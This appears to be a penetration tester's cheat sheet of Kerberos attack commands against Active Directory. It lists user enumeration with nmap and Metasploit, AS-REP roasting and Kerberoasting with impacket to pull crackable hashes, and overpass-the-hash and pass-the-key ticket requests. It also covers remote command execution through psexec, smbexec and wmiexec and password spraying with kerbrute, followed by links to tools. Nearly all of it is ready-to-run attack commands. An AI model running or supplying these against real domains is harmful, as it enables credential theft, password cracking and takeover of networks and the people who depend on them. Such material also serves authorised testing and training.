#### nmap
```bash - kali
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='$DOMAIN_NAME'" $TARGET
```

#### MSF
```metasploit - kali
use auxiliary/gather/kerberos_enumusers 
```

# Check for Kerberoasting: 
```bash - kali
GetNPUsers.py DOMAIN-Target/ -usersfile user.txt -dc-ip $TARGET -format hashcat/john
```

# GetUserSPNs
```bash - kali
impacket-GetUserSPNs $DOMAIN_NAME/$USER:$PASSWORD -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
```

```bash - kali
impacket-GetUserSPNs $DOMAIN_NAME/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
```

# Kerberoasting: 
```bash - kali
impacket-GetUserSPNs $DOMAIN_NAME/$USER:PASSWORD -outputfile <output_TGSs_file> 
```

#### Overpass The Hash/Pass The Key (PTK):
```bash - kali
python3 getTGT.py $DOMAIN_NAME/$USER -hashes [lm_hash]:<ntlm_hash> -dc-ip $DOMAIN_CONTROLLER_IP
```

```bash - kali
python3 getTGT.py $DOMAIN_NAME/$USER -aesKey <aes_key> -dc-ip $DOMAIN_CONTROLLER_IP
```

```bash - kali
python3 getTGT.py $DOMAIN_NAME/$USER:$PASSWORD -dc-ip $DOMAIN_CONTROLLER_IP
```

#### Using TGT key to execute remote commands from the following impacket scripts:
```bash - kali
python3 psexec.py $DOMAIN_NAME/$USER@$TARGET -k -no-pass
```

```bash - kali
python3 smbexec.py $DOMAIN_NAME/$USER@$TARGET -k -no-pass
```

```bash - kali
python3 wmiexec.py $DOMAIN_NAME/$USER@$TARGET -k -no-pass
```

https://www.tarlogic.com/blog/como-funciona-kerberos/
https://www.tarlogic.com/blog/como-atacar-kerberos/

```bash - kali
python kerbrute.py -dc-ip $TARGET -users /root/kb_users.txt -passwords /root/pass_common_plus.txt -threads 20 -domain $DOMAIN_NAME -outputfile kb_extracted_passwords.txt
```

https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/
https://github.com/GhostPack/Rubeus
https://github.com/fireeye/SSSDKCMExtractor
https://gitlab.com/Zer1t0/cerbero